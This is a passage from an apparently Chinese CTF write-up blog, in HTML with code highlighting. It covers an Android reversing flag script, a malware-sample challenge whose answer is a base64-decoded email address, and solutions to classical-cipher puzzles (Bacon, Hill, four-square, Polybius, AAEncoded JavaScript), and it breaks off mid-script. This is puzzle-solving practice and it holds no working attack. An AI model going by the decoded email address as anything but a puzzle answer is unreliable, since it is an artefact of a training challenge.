punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">char</span> a <span class="token operator">=</span> x<span class="token punctuation">[</span><span class="token number">31</span> <span class="token operator">-</span> i<span class="token punctuation">]</span><span class="token punctuation">;</span>        x<span class="token punctuation">[</span><span class="token number">31</span> <span class="token operator">-</span> i<span class="token punctuation">]</span> <span class="token operator">=</span> x<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        x<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> a<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    textview<span class="token punctuation">.</span><span class="token function">setText</span><span class="token punctuation">(</span><span class="token string">"flag&#123;"</span> <span class="token operator">+</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"&#125;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>不到10行的简单变换，直接出python脚本如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">x <span class="token operator">=</span> <span class="token string">'dd2940c04462b4dd7c450528835cca15'</span>x <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>x<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">50</span><span class="token punctuation">)</span>x<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">48</span><span class="token punctuation">)</span>x<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token number">31</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">48</span><span class="token punctuation">)</span>x<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">97</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    a <span class="token operator">=</span> x<span class="token punctuation">[</span><span class="token number">31</span> <span class="token operator">-</span> i<span class="token punctuation">]</span>    x<span class="token punctuation">[</span><span class="token number">31</span> <span class="token operator">-</span> i<span class="token punctuation">]</span> <span class="token operator">=</span> x<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    x<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> a<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'flag&#123;'</span> <span class="token operator">+</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'&#125;'</span><span class="token punctuation">)</span><span class="token comment"># flag&#123;59acc538825054c7de4b26440c0999dd&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Android病毒逆向"><a href="#Android病毒逆向" class="headerlink" title="Android病毒逆向"></a>Android病毒逆向</h2><h3 id="相册"><a href="#相册" class="headerlink" title="相册"></a>相册</h3><blockquote><p>描述:你好，这是上次聚会相片，你看看（病毒，不建议安装到手机，提取完整邮箱即为flag） 注意：得到的 flag 请包上 flag{} 提交</p></blockquote><p>题目挺简单的，就是软件没在模拟器上打得开，所以直接就逆向了一下so文件，直接找到最后的base64的三个串，都解一下密，发现</p><pre class="line-numbers language-none"><code class="language-none">MTgyMTg0NjUxMjVAMTYzLmNvbQ&#x3D;&#x3D;18218465125@163.com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>所以flag就是上面的这个网易邮箱套上个flag即可。</p><h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="古典密码"><a href="#古典密码" class="headerlink" title="古典密码"></a>古典密码</h2><h3 id="培根密码"><a href="#培根密码" class="headerlink" title="培根密码"></a>培根密码</h3><p><a href="http://rumkin.com/tools/cipher/baconian.php">培根密码在线解密</a></p><h4 id="GUET-CTF2019-NO-SOS"><a href="#GUET-CTF2019-NO-SOS" class="headerlink" title="[GUET-CTF2019]NO SOS"></a>[GUET-CTF2019]NO SOS</h4><p>原来题目上面都说了不是SOS也就是莫斯电码，而且如果是摩斯密码的话，没给出分隔符也是不好解的。所以这里是培根密码，本来只是AB这两个字符的故事，但是这两个字符可以使用其他的字符来表示，所以培根密码的形式是各式各样的都有，这里把<code>.</code>换成<code>A</code>、把<code>-</code>换成<code>B</code>即可</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span>–……<span class="token punctuation">.</span>–<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span>…<span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span>…–<span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span>…<span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span>–<span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span>—<span class="token operator">-</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>太坑爹了，这个格式竟然还有错误，要修改为下面的内容</p><pre class="line-numbers language-none"><code class="language-none">..-.-.-.--.......--..-...-..-...--.-.-....-..-..--.-.-..-.-..----<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> s <span class="token operator">=</span> <span class="token string">'..-.-.-.--.......--..-...-..-...--.-.-....-..-..--.-.-..-.-..----'</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'-'</span><span class="token punctuation">,</span><span class="token string">'B'</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>AABABABABBAAAAAAABBAABAAABAABAAABBABABAAAABAABAABBABABAABABAABBBB<span class="token operator">>></span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>然后粘贴出去在线培根解密即可。</p><p><img src="/2021/05/28/CTF/image-20210729205524795.png" alt></p><pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">flag&#123;guetkkp&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="希尔密码"><a href="#希尔密码" class="headerlink" title="希尔密码"></a>希尔密码</h3><p><a href="https://www.cnblogs.com/mcprimer/articles/1418967.html">什么是希尔密码</a></p><h4 id="UTCTF2020-hill"><a href="#UTCTF2020-hill" class="headerlink" title="[UTCTF2020]hill"></a>[UTCTF2020]hill</h4><p>给出的内容为<code>wznqca&#123;d4uqop0fk_q1nwofDbzg_eu&#125;</code>，<code>wznqca</code>对应的内容就是<code>utflag</code>，而且这种加密是只针对字母来的。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> strings <span class="token operator">=</span> <span class="token string">'wznqcaduqopfkqnwofDbzgeu'</span>flag_pre <span class="token operator">=</span> <span class="token string">'utflag'</span>dic <span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_letters<span class="token comment"># 猜测n为2，那么密钥就是2行2列的矩阵，与之相乘的矩阵也必定是2行的，故可以使用下面的方式爆破key</span><span class="token keyword">def</span> <span class="token function">getkey</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> b1<span class="token punctuation">,</span> c1<span class="token punctuation">,</span> a2<span class="token punctuation">,</span> b2<span class="token punctuation">,</span> c2<span class="token punctuation">,</span> a3<span class="token punctuation">,</span> b3<span class="token punctuation">,</span> c3<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>a1 <span class="token operator">*</span> i <span class="token operator">+</span> b1 <span class="token operator">*</span> j<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">==</span> c1 <span class="token keyword">and</span> <span class="token punctuation">(</span>a2 <span class="token operator">*</span> i <span class="token operator">+</span> b2 <span class="token operator">*</span> j<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">==</span> c2 <span class="token keyword">and</span> <span class="token punctuation">(</span>a3 <span class="token operator">*</span> i <span class="token operator">+</span> b3 <span class="token operator">*</span> j<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">==</span> c3<span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span>x1 <span class="token operator">=</span> getkey<span class="token punctuation">(</span><span class="token number">22</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>  <span class="token comment"># wzu nqt caa</span>x2 <span class="token operator">=</span> getkey<span class="token punctuation">(</span><span class="token number">22</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">19</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span>flag <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    flag <span class="token operator">+=</span> dic<span class="token punctuation">[</span><span class="token punctuation">(</span>x1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> dic<span class="token punctuation">.</span>index<span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> x1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">*</span> dic<span class="token punctuation">.</span>index<span class="token punctuation">(</span>s<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span><span class="token punctuation">]</span>    flag <span class="token operator">+=</span> dic<span class="token punctuation">[</span><span class="token punctuation">(</span>x2<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> dic<span class="token punctuation">.</span>index<span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> x2<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">*</span> dic<span class="token punctuation">.</span>index<span class="token punctuation">(</span>s<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token comment"># utflag&#123;d4nger0us_c1pherText_qq&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="四方密码"><a href="#四方密码" class="headerlink" title="四方密码"></a>四方密码</h3><p><a href="http://ctf.ssleye.com/four.html">四方密码在线</a></p><p><a href="https://wtool.com.cn/four.html">四方密码在线2</a></p><h4 id="四面八方"><a href="#四面八方" class="headerlink" title="四面八方"></a>四面八方</h4><pre class="line-numbers language-none"><code class="language-none">key1:securitykey2:informationsecurityabdfghklmnopqvwxzinformatbcdeghklpqsuvwxyz密文啊这是，骚年加油：zhnjinhoopcfcuktlj解出来是：ypqcgaodrtccesnkqa<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/05/28/CTF/image-20210727201446789.png" alt></p><p>再qiupquip一下就行了，我没解出来，这也太**了，为啥不直接就得flag呢。。。</p><pre class="line-numbers language-none"><code class="language-none">youngandsuccessful<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="特殊字符"><a href="#特殊字符" class="headerlink" title="特殊字符"></a>特殊字符</h3><h4 id="ctfshow、crypto3"><a href="#ctfshow、crypto3" class="headerlink" title="ctfshow、crypto3"></a>ctfshow、crypto3</h4><p><strong>TAG: jsfuck、颜文字</strong></p><p>给出的内容是一些特殊的字符，其实看起来是有一些眼熟的，但是就是想不起来，后来看看wp发现是我的浏览器上这个东西乱码</p><p><img src="/2021/05/28/CTF/image-20210720125250839.png" alt></p><p>我是先<code>另存界面为</code>，然后再打开另存出来的txt就会自动编好正确的码啦</p><pre class="line-numbers language-none"><code class="language-none">ﾟωﾟﾉ&#x3D; &#x2F;｀ｍ´）ﾉ ~┻━┻   &#x2F;&#x2F;*´∇｀*&#x2F; [&#39;_&#39;]; o&#x3D;(ﾟｰﾟ)  &#x3D;_&#x3D;3; c&#x3D;(ﾟΘﾟ) &#x3D;(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) &#x3D;(ﾟΘﾟ)&#x3D; (o^_^o)&#x2F; (o^_^o);(ﾟДﾟ)&#x3D;&#123;ﾟΘﾟ: &#39;_&#39; ,ﾟωﾟﾉ : ((ﾟωﾟﾉ&#x3D;&#x3D;3) +&#39;_&#39;) [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ &#39;_&#39;)[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ&#x3D;&#x3D;3) +&#39;_&#39;)[ﾟｰﾟ] &#125;; (ﾟДﾟ) [ﾟΘﾟ] &#x3D;((ﾟωﾟﾉ&#x3D;&#x3D;3) +&#39;_&#39;) [c^_^o];(ﾟДﾟ) [&#39;c&#39;] &#x3D; ((ﾟДﾟ)+&#39;_&#39;) [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) [&#39;o&#39;] &#x3D; ((ﾟДﾟ)+&#39;_&#39;) [ﾟΘﾟ];(ﾟoﾟ)&#x3D;(ﾟДﾟ) [&#39;c&#39;]+(ﾟДﾟ) [&#39;o&#39;]+(ﾟωﾟﾉ +&#39;_&#39;)[ﾟΘﾟ]+ ((ﾟωﾟﾉ&#x3D;&#x3D;3) +&#39;_&#39;) [ﾟｰﾟ] + ((ﾟДﾟ) +&#39;_&#39;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ&#x3D;&#x3D;3) +&#39;_&#39;) [ﾟΘﾟ]+((ﾟｰﾟ&#x3D;&#x3D;3) +&#39;_&#39;) [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) [&#39;c&#39;]+((ﾟДﾟ)+&#39;_&#39;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) [&#39;o&#39;]+((ﾟｰﾟ&#x3D;&#x3D;3) +&#39;_&#39;) [ﾟΘﾟ];(ﾟДﾟ) [&#39;_&#39;] &#x3D;(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)&#x3D;((ﾟｰﾟ&#x3D;&#x3D;3) +&#39;_&#39;) [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+&#39;_&#39;) [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ&#x3D;&#x3D;3) +&#39;_&#39;) [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ&#x3D;&#x3D;3) +&#39;_&#39;) [ﾟΘﾟ]+ (ﾟωﾟﾉ +&#39;_&#39;) [ﾟΘﾟ]; (ﾟｰﾟ)+&#x3D;(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]&#x3D;&#39;\\&#39;; (ﾟДﾟ).ﾟΘﾟﾉ&#x3D;(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)&#x3D;(ﾟωﾟﾉ +&#39;_&#39;)[c^_^o];(ﾟДﾟ) [ﾟoﾟ]&#x3D;&#39;\&quot;&#39;;(ﾟДﾟ) [&#39;_&#39;] ( (ﾟДﾟ) [&#39;_&#39;] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) (&#39;_&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/05/28/CTF/image-20210720144305920.png" alt></p><h3 id="波利比奥斯方阵密码"><a href="#波利比奥斯方阵密码" class="headerlink" title="波利比奥斯方阵密码"></a>波利比奥斯方阵密码</h3><p><img src="/2021/05/28/CTF/image-20210726132638982.png" alt="波利比奥斯方阵密码"></p><h4 id="BJDCTF2020-Polybius"><a href="#BJDCTF2020-Polybius" class="headerlink" title="[BJDCTF2020]Polybius"></a>[BJDCTF2020]Polybius</h4><p>题目中给出的信息为</p><pre class="line-numbers language-none"><code class="language-none">密文：ouauuuoooeeaaiaeauieuooeeieahint：VGhlIGxlbmd0aCBvZiB0aGlzIHBsYWludGV4dDogMTQ&#x3D;flag:解出明文后，请加上BJD&#123;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>将hint解base64之后得明文为<code>The length of this plaintext: 14</code></p><p>但是没有给出加密的表格，也就是棋盘密码中的棋盘，这就要一个个的碰撞，写出脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> itertoolshead <span class="token operator">=</span> <span class="token string">'aeiou'</span>ciphertext <span class="token operator">=</span> <span class="token string">'ouauuuoooeeaaiaeauieuooeeiea'</span>polybiusd <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">0</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token comment"># 创建波利比奥斯方阵</span><span class="token keyword">def</span> <span class="token function">polybius</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    flag <span class="token operator">=</span> <span class="token number">1</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token number">2</span> <span class="token keyword">and</span> j <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">:</span>                polybiusd<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">96</span> <span class="token operator">+</span> <span class="token punctuation">(</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">5</span> <span class="token operator">+</span> j<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\\'</span> <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">96</span> <span class="token operator">+</span> <span class="token punctuation">(</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">5</span> <span class="token operator">+</span> j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>                flag <span class="token operator">=</span> <span class="token number">0</span>                <span class="token keyword">continue</span>            <span class="token keyword">if</span> flag<span class="token punctuation">:</span>                polybiusd<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">96</span> <span class="token operator">+</span> <span class="token punctuation">(</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">5</span> <span class="token operator">+</span> j<span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                polybiusd<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">96</span> <span class="token operator">+</span> <span class="token punctuation">(</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">5</span> <span class="token operator">+</span> j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>polybiusd<span class="token punctuation">)</span><span class="token comment"># 利用itertools.permutations()对字典进行全排列的性质进行字典的创建</span><span class="token keyword">def</span> <span class="token function">listall</span><span 